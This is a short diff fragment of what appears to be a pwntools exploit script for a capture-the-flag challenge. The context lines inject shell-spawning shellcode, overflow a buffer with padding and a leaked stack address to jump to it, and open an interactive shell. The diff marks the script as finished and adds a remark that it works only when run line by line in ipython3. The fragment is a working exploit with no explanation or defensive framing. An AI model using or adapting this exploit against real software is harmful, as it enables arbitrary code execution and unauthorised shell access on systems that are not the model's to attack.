@@ -7,4 +7,6 @@ stack = int(_,16)
 p.sendline(b'' + asm(shellcraft.sh()))
 p.sendline(b'' + (0x60-0x8)*b'A' + p64(stack))
 p.interactive()
-# NOT FINISHED
+#FINISHED
+
+#only works in ipython3 - use the exact lines in ipython3 and it will work
